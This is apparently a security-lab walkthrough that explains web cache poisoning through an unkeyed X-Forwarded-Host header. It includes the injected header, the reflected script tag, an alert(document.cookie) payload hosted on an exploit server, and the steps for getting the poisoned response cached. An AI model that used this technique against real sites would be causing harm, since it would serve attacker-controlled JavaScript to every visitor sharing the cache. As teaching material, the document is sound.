### [PS-CACHE-01] Web cache poisoning with an unkeyed header

**Scenario:** The target application relies on an unkeyed HTTP header (`X-Forwarded-Host`) to dynamically construct script import URLs on the homepage, enabling an attacker to poison the HTTP cache and serve malicious JavaScript to visitors.

**Solution:**

1. Intercept `GET /` in Burp Repeater and test for unkeyed header behavior by adding:
```http
X-Forwarded-Host: exploit-server.net

```


2. Send the request and verify in the response body that the imported script source reflects the header value:
```html
<script src="//exploit-server.net/resources/js/tracking.js"></script>

```


3. Navigate to the Exploit Server and create a file at path `/resources/js/tracking.js` with the body:
```javascript
alert(document.cookie);

```


4. Return to Burp Repeater and send the request with `X-Forwarded-Host: exploit-server.net` repeatedly until the response header contains `X-Cache: hit`.
5. Visit the application homepage in a clean browser window to confirm execution of the cached XSS payload.

> **Key Takeaway:** Unkeyed headers that influence dynamic content generation allow attackers to rewrite response logic. Once cached, the poisoned response is served to all users sharing that cache key.

---